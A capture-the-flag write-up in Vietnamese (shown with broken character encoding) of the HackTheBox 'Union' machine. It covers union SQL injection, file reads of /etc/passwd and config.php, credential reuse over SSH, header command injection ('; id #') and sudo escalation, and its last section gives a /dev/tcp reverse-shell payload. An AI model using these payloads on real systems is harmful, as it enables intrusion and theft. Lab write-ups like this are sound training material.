---
title: Union
Date: 2025-01-08
categories: HackTheBox Medium
tags:
  - HTB
  - Union
---
# MÃ´ táº£
Äá»™t nhiÃªn muá»‘n trÃ£i nghiá»‡m thá»­ cáº£m giÃ¡c chiáº¿n bÃ i medium thÃ´i chá»© cÅ©ng khÃ´ng biáº¿t mÃ´ táº£ gÃ¬ kkkk.
ÄÃ¢y lÃ  má»™t Ã­t mÃ´ táº£ cá»§a bÃ i lab.

![image](https://github.com/user-attachments/assets/6c48ca3b-84b7-4e4d-a166-a6d460542439)
# Attack
## Recon
Nmap

![image](https://github.com/user-attachments/assets/72c6f2c9-daec-46b0-836d-f0df668ed2ef)
![image](https://github.com/user-attachments/assets/7ae6be4b-72f5-4459-9da7-7c1e943be255)

DÃ¹ng vÃ¬ mÃ¡y cÃ´ng ty bá»‹ cáº¥n policy nhiá»u quÃ¡, máº·c dÃ¹ Ä‘Ã£ vpn nhÆ°ng mÃ¬nh váº«n khÃ´ng Ä‘i web Ä‘Æ°á»£c nÃªn mÃ¬nh quyáº¿t Ä‘á»‹nh chuyá»ƒn qua dÃ¹ng mÃ¡y cÃ¡ nhÃ¢n hack tiáº¿p ğŸ˜œ.

<img width="1396" alt="Screenshot 2025-01-07 at 15 45 19" src="https://github.com/user-attachments/assets/91ca53b3-62a8-4566-9b81-01c1c841563b" />

Giao diá»‡n web cÅ©ng chá»‰ Ä‘Æ¡n giáº£n cÃ³ má»™t form check gÃ¬ Ä‘Ã³. Báº£n nÄƒng pentest trá»™i dáº«y ğŸ¤£ pháº£i fuzzing thÃ´i.

<img width="753" alt="Screenshot 2025-01-07 at 15 49 38" src="https://github.com/user-attachments/assets/9a33573a-b9d5-44e2-b2d2-f2115378df79" />

XSS ez ğŸ¤£ğŸ¤£ğŸ¤£ mÃ  mÃ¬nh nghÄ© bug nÃ y cháº¯c chÆ°a pháº£i Ã½ Ä‘á»“ chÃ­nh cá»§a bÃ i lab nÃ y. Fuzz thá»­ cÃ¡c bug khÃ¡c xem sao.
CÃ³ má»™t Ä‘iá»u mÃ  mÃ¬nh khÃ´ng hiá»ƒu Ä‘Æ°á»£c ráº±ng lÃ : mÃ¬nh nháº­p báº¥t ká»³ thá»© gÃ¬ vÃ o thÃ¬ ná»™i dung pháº£n há»“i váº«n lÃ  `Congratulations ... you may compete in this tournament!` nhÆ° hÃ¬nh dÆ°á»›i.

![Screenshot](/assets/htb/Screenshot 2025-01-21 at 16.44.26.png)

Thá»­ fuzz payload SQLi tháº§n thÃ¡nh thÃ¬ láº¡i cÃ³ hiá»‡n tÆ°á»£ng láº¡ !!!!
Khi mÃ¬nh dÃ¹ng `or` thÃ¬ cÃ¡c tháº» html khÃ´ng Ä‘Æ°á»£c hiá»‡n thá»‹ ná»¯a nhÆ° 2 hÃ¬nh dÆ°á»›i Ä‘Ã¢y lÃ  sá»± khÃ¡c biá»‡t cá»§a `or` vÃ  `and`.

![Screenshot](/assets/htb/Screenshot 2025-01-21 at 16.49.14.png)

![Screenshot](/assets/htb/Screenshot 2025-01-21 at 16.49.36.png)

â¾ Kháº£ nÄƒng nÃ³ Ä‘ang filter `or` cá»§a mÃ¬nh.
Tuy lÃ  cÃ³ sá»± khÃ¡c biá»‡t nhÆ°ng cÃ¡i mÃ¬nh muá»‘n lÃ  Ä‘á»‘i vá»›i trÆ°á»ng há»£p ngÆ°á»i dÃ¹ng khÃ´ng Ä‘Æ°á»£c tham gia giáº£i Ä‘áº¥u thÃ¬ sáº½ hiá»‡n thá»‹ nhÆ° tháº¿ nÃ o ? Pháº£i input vÃ o Ä‘iá»u gÃ¬ Ä‘á»ƒ cÃ³ thá»ƒ nháº­n Ä‘Æ°á»£c Ä‘iá»u nhÆ° mÃ¬nh mong muá»‘n ?
Cáº£m tháº¥y khÃ´ng cÃ²n hÆ°á»›ng nÃ o khÃ¡c. Quay láº¡i challenge Ä‘á»c láº¡i mÃ´ táº£ cá»§a bÃ i lab nhÆ° Ä‘áº§u post mÃ¬nh cÃ³ chia sáº».

![Screenshot](/assets/htb/Screenshot 2025-01-21 at 16.53.21.png)

Nhá» váº­y mÃ  mÃ¬nh má»›i biáº¿t bÃ i lab nÃ y Ä‘Ã£ tá»“n táº¡i tá»« nÄƒm 2021 vÃ  Ä‘Æ°á»£c táº¡o ra bá»Ÿi `ippsec`. á»¦a `ippsec` Ä‘Ã¢y lÃ  tÃªn cá»§a má»™t ngÆ°á»i dÃ¹ng mÃ  nhá»‰ ? MÃ  cÅ©ng lÃ  ngÆ°á»i táº¡o ra bÃ i lab nÃ y. Liá»‡u nÃ³ cÃ³ lan quyÃªn gÃ¬ tá»›i ngÆ°á»i chÆ¡i trong bÃ i lab khÃ´ng ta ? Hmm Ä‘á»ƒ thá»­ xem sao !

![Screenshot](/assets/htb/Screenshot 2025-01-21 at 16.56.10.png)

Ã Ä‘Ã¹ ! CÃ¡i thá»© mÃ  mÃ¬nh Ä‘ang cáº§n Ä‘Ã¢y rá»“i.
Tháº¿ thÃ¬ giáº£ sá»­ `ippsec` lÃ  value cá»§a má»™t cá»™t nÃ o Ä‘Ã³ trong table `players`. ThÃ¬ cÃ¢u query sáº½ cÃ³ thá»ƒ lÃ  `select player from players where player = $player`. Náº¿u giÃ¡ trá»‹ player cÃ³ trong table thÃ¬ nÃ³ sáº½ hiá»‡n thá»‹ `Sorry, ....` cÃ²n ngÆ°á»£c láº¡i thÃ¬ sáº½ `Congratulations ....` nhÆ° trÃªn.
ÄÃ³ cÅ©ng chá»‰ lÃ  nhá»¯ng gÃ¬ mÃ¬nh suy Ä‘oÃ¡n thÃ´i. Giá» mÃ¬nh attack má»›i biáº¿t Ä‘Æ°á»£c rÃµ ngá»n ngÃ nh.
## SQL Injection
NhÆ° thÆ°á»ng lá»‡ mÃ¬nh sáº½ fuzz `' or 1=1` cho nhanh. NhÆ°ng nhÆ° trÃªn mÃ¬nh Ä‘Ã£ phÃ¢n tÃ­ch thÃ¬ cÃ³ váº» nhÆ° nÃ³ Ä‘Ã£ block `or` cá»§a mÃ¬nh => khÃ´ng thá»ƒ dÃ¹ng payload Ä‘Ã³ Ä‘Æ°á»£c.
CÃ²n náº¿u Ä‘á»•i qua `' and 1=1` thÃ¬ láº¡i khÃ´ng há»£p lÃ­ vÃ¬ khi muá»‘n sá»­ dá»¥ng `and` mÃ¬nh pháº£i Ä‘áº£m báº£o váº¿ trÆ°á»›c vÃ  sau `and` Ä‘á»u Ä‘Ãºng thÃ¬ má»›i cÃ¢u query má»›i Ä‘Ãºng Ä‘Æ°á»£c, náº¿u khÃ´ng thÃ¬ nÃ³ váº«n pháº£n há»“i vá» cho mÃ¬nh lÃ  `Congratulations ....` => cÃ¡ch nÃ y cÅ©ng khÃ´ng kháº£ thi Ä‘Æ°á»£c.
Tháº¿ thÃ¬ mÃ¬nh sáº½ sá»­ dá»¥ng `union` Ä‘á»ƒ khai thÃ¡c thÃ´i.

![Screenshot](/assets/htb/Screenshot 2025-01-21 at 17.25.25.png)

![Screenshot](/assets/htb/Screenshot 2025-01-21 at 17.26.00.png)

ÄÃºng nhÆ° cÃ¢u query mÃ¬nh Ä‘Ã£ suy Ä‘oÃ¡n nÃ³ chá»‰ cÃ³ 1 cá»™t.
Ok váº­y thÃ¬ tÃ¬m db name thÃ´i.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 13.53.02.png)

> Giáº£i thÃ­ch 1 tÃ½ cho ai tháº¯c máº¯c ráº±ng táº¡i sao payload bÃ¢y giá» chá»‰ cÃ²n lÃ  `' ....` thay vÃ¬ `ippsec' ...` nhÆ° lÃºc Ä‘áº§u. 
> LÃ  vÃ¬ khi sá»­ dá»¥ng toÃ¡n tá»­ `order by` káº¿t quáº£ Ä‘á»ƒ mÃ¬nh nháº­n biáº¿t sá»‘ cá»™t lÃ  Ä‘Ãºng sai cá»§a response, cÃ²n khi sá»­ dá»¥ng `union` vÃ  Ä‘áº·c biá»‡t á»Ÿ trÆ°á»ng há»£p nÃ y káº¿t quáº£ cÃ²n Ä‘Æ°á»£c hiá»‡n thá»‹ á»Ÿ response ná»¯a nÃªn lÃ  mÃ¬nh pháº£i lÃ m cho cÃ¢u query á»Ÿ phÃ­a trÆ°á»›c `union` trá»Ÿ nÃªn khÃ´ng Ä‘Ãºng thÃ¬ lÃºc Ä‘Ã³ káº¿t quáº£ hiá»‡n thá»‹ sáº½ lÃ  cÃ¢u query phÃ­a sau `union`. Trong trÆ°á»ng há»£p nÃ y lÃ  database name `november`.

CÃ¡c table cÃ³ trong database `november`.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 14.02.19.png)

## Flag 1
CÃ¡c column cÃ³ trong table `flag`.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 14.04.47.png)

Data cá»§a cá»™t `one` trong table `flag`.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 14.05.56.png)

Yeah mÃ¬nh Ä‘Ã£ cÃ³ Ä‘Æ°á»£c flag: `UHC{F1rst_5tep_2_Qualify}`, tuy nhiÃªn flag nÃ y sáº½ submit á»Ÿ Ä‘Ã¢u ta ?
Quay ngÆ°á»£c thá»i gian vá» láº¡i page check player. Sau khi check player website cÃ³ cho mÃ¬nh má»™t endpoint `challenge.php` Ä‘Æ°á»£c liÃªn káº¿t vá»›i chá»¯ `here`.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 14.07.35.png)

Click vÃ o Ä‘Ã³ thÃ¬ mÃ¬nh tháº¥y Ä‘Æ°á»£c nÆ¡i input flag nÃ y. Thá»­ xem cÃ³ gÃ¬ hot tiáº¿p theo.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 14.09.18.png)

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 14.10.56.png)

Sau khi submit thÃ¬ mÃ¬nh Ä‘Æ°á»£c chuyá»ƒn hÆ°á»›ng qua endpoint `firewall.php` Ä‘á»“ng thá»i cÅ©ng nháº­n Ä‘Æ°á»£c má»™t thÃ´ng bÃ¡o tá»« website lÃ  IP mÃ  mÃ¬nh Ä‘ang sá»­ dá»¥ng cho bÃ i lab nÃ y Ä‘Ã£ má»Ÿ port SSH: 22.
Thá»­ `nmap` láº¡i má»™t láº§n ná»¯a xem sao.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 22.58.42.png)

ÄÃºng váº­y mÃ¬nh Ä‘Ã£ cÃ³ thÃªm port 22. Tuy nhiÃªn mÃ¬nh lÃ m gÃ¬ cÃ³ credential Ä‘á»ƒ connect ssh Ä‘Ã¢u nhá»‰ ? Quay láº¡i manh má»‘i ban Ä‘áº§u, mÃ¬nh váº«n cÃ²n má»™t table `players` trong database chÆ°a xem. Thá»­ xem sao ?

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 14.16.45.png)

Eo Ã´i, table Ä‘Ã³ cÅ©ng chá»‰ cÃ³ má»™t column lÃ  `player` vÃ  cÅ©ng chá»‰ cÃ³ 1 player lÃ  `ippsec`. K láº½ Ä‘Æ°á»ng cÃ¹ng rá»“i nhá»‰ ?
Ã€ hÃ¡ hÃ¬nh nhÆ° SQLi cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c file trÃªn system thÃ´ng qua hÃ m `load_file`. Äá»ƒ thá»­ vá»›i 1 file phá»• biáº¿n trÃªn linux xem `/etc/passwd` (mÃ¬nh cÅ©ng lo khÃ´ng Ä‘á»§ quyá»n Ä‘á»c file nÃ y, mÃ  cá»© thá»­ thÃ´i).

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 15.10.57.png)

Wow, ngon nuÃ´n. á»¦a mÃ  khoan, dá»«ng khoáº£ng chá»«ng lÃ  2s !!! Muá»‘n Ä‘á»c source mÃ  chÆ°a biáº¿t web root náº±m á»Ÿ Ä‘Ã¢u ?
Hmmm, `php` láº¡i cÃ²n `mysql`, combo nÃ y thá»i sinh viÃªn mÃ¬nh hay chÆ¡i chung vá»›i xampp (`/opt/lampp/htdocs`) hoáº·c lÃ  `/var/www/html`. Cá»© thá»­ vá»›i file `index.php` xem nhÆ° lÃ o ğŸ˜….

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 15.15.41.png)

ThÆ¡m ngon má»i báº¡n xÆ¡i nhoa ğŸ¤£. VÃ´ tÃ¬nh tháº¥y Ä‘Æ°á»£c cÃ¢u query tá»“n táº¡i lá»—i SQLi ik nhÆ° ban nÃ£y mÃ¬nh phÃ¢n tÃ­ch lÃºc khai thÃ¡c SQLi lun.
ThÃ´ng thÆ°á»ng Ä‘á»c Ä‘Æ°á»£c file nhÆ° váº­y mÃ¬nh sáº½ hay Ä‘á»ƒ Ã½ vÃ o nhá»¯ng chá»— import hoáº·c require Ä‘á»ƒ xem bÃªn trong source sáº½ cÃ²n cÃ³ nhá»¯ng file nÃ o. Trong trÆ°á»ng há»£p nÃ y mÃ¬nh tháº¥y file `index.php` Ä‘ang Ä‘Æ°á»£c require tá»›i file `config.php`. Lá»¥m nÃ³ luÃ´n chá»© sao dá» ğŸ¤£.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 15.33.05.png)

CÃ³ Ä‘Æ°á»£c user/pass cá»§a database. NhÆ°ng mÃ  nÃ³ thÃ¬ cÃ³ liÃªn quan gÃ¬ tá»›i user/pass ssh mÃ  mÃ¬nh Ä‘ang cáº§n Ä‘Ã¢u nhá»‰ ? á»¦a mÃ  táº¡i sao k thá»­ 1 láº§n ?

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 15.35.20.png)

Ngon thÃ­a nhá»Ÿ ! HÃºp flag 1 thÃ´i.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 15.36.01.png)

> Flag 1: `65a4df49ae61313174cb14b04348bcf2`

## Privileges
NhÆ° má»™t thÃ³i quen, mÃ¬nh `sudo -l` nhÆ°ng user nÃ y láº¡i khÃ´ng cÃ³ quyá»n sudo.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 15.55.06.png)

ThÃ´i thÃ¬ quay láº¡i Ä‘á»c source xem cÃ³ cÃ¡ch nÃ o khÃ¡c khÃ´ng. SSH Ä‘Æ°á»£c rá»“i thÃ¬ dump source vá» mÃ¡y Ä‘á»c cho dá»….

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 15.57.36.png)

Source vá»n váº¹n chá»‰ cÃ³ 4 file vÃ  1 folder. NhÆ°ng Ä‘iá»u lÃ m mÃ¬nh chÃº Ã½ nháº¥t náº±m á»Ÿ dÃ²ng 27 cá»§a file `firewall.php`. NÃ´m na Ä‘oáº¡n php tá»« dÃ²ng 21-27 nghÄ©a lÃ  náº¿u header request cÃ³ trÆ°á»ng `X-Forwarded-For` thÃ¬ biáº¿n `ip` sáº½ láº¥y tá»« Ä‘Ã³ vÃ  vÃ  táº¡o má»™t rule cho firewall (cho phÃ©p cÃ¡c gÃ³i tin tá»« ip Ä‘Ã³ Ä‘i vÃ o mÃ¡y chá»§). NgÆ°á»£c láº¡i thÃ¬ sáº½ láº¥y biáº¿n `ip` tá»« `REMOTE_ADDR`.
á» Ä‘oáº¡n code trÃªn náº¿u mÃ¬nh inject thÃªm má»™t command linux nÃ o Ä‘Ã³ vÃ o thÃ¬ thÃ´ng qua hÃ m `system` liá»‡u nÃ³ cÃ³ Ä‘Æ°á»£c thá»±c thi khÃ´ng ? Äá»ƒ thá»±c hiá»‡n idea Ä‘Ã³ thÃ¬ mÃ¬nh sáº½ táº¡o ra payload trÆ°á»›c.
PhÃ¢n tÃ­ch má»™t chÃºt. MÃ¬nh sáº½ dÃ¹ng `;` Ä‘á»ƒ káº¿t thÃºc command `iptables` vÃ  sau Ä‘Ã³ viáº¿t thÃªm command `id` thÃ¬ nÃ³ sáº½ thá»±c hiá»‡n `iptables` xong sau Ä‘Ã³ sáº½ thá»±c hiá»‡n `id`. Tuy nhiÃªn pháº§n `-j ACCEPT` á»Ÿ phÃ­a trÃªn sáº½ bá»‹ cáº¥n, vÃ¬ váº­y mÃ¬nh nÃªn ghi chÃº chÃºng láº¡i, Ä‘á»ƒ ghi chÃº trong php mÃ¬nh sáº½ sá»­ dá»¥ng `#`.
-> Payload: `; id #`.
BÃ¢y giá» thá»­ `curl` Ä‘áº¿n endpoint `firewall.php` vÃ  thá»±c hiá»‡n idea trÃªn thÃ´i nÃ o.
HÆ¡i lag má»™t chÃºt, mÃ¬nh pháº£i reset láº¡i lab.

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 16.40.48.png)

QuÃ¡ thum, Ä‘Ãºng nhÆ° Ã½ Ä‘á»“ ban Ä‘áº§u. á»¦a nhÆ°ng mÃ  sao láº¡i lÃ  user `www-data` nhá»‰ ? Thá»­ command huyá»n thoáº¡i `sudo -l` má»™t láº§n ná»¯a xem cÃ³ gÃ¬ hot khum ?

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 16.42.45.png)

Hot thiá»‡c !!! Vá»›i cáº¥u hÃ¬nh nhÆ° hÃ¬nh trÃªn thÃ¬ mÃ¬nh cÃ³ thá»ƒ sá»­ dá»¥ng `sudo` báº¥t ká»³ Ä‘Ã¢u vá»›i quyá»n user `www-data`. Tháº¿ thÃ¬ ngáº¡i gÃ¬ mÃ  khÃ´ng cat flag tá»« thÆ° má»¥c root thÃ´i nÃ o.

## Flag 2

![Screenshot](/assets/htb/Screenshot 2025-01-22 at 16.45.29.png)

> Flag 2: `b94085f765bb9ecb8edc56bd4c872ad0`

# CÆ¡m thÃªm
> NgoÃ i ra cÃ¡c báº¡n cÃ³ thá»ƒ *reverse shell* Ä‘á»ƒ Ä‘á»ƒ get root báº±ng cÃ¡ch sá»­ dá»¥ng payload nÃ y `; sudo bash -c "bash -i >& /dev/tcp/10.10.16.11/2804 0>&1";` vÃ  combo [TTY-SHELL](https://d7cky.github.io/posts/TTY-SHELL/) (lÃ m shell Ä‘áº¹p hÆ¡n ğŸ¤£) Ä‘á»ƒ dá»… dÃ ng thao tÃ¡c trÃªn cÃ¡c command.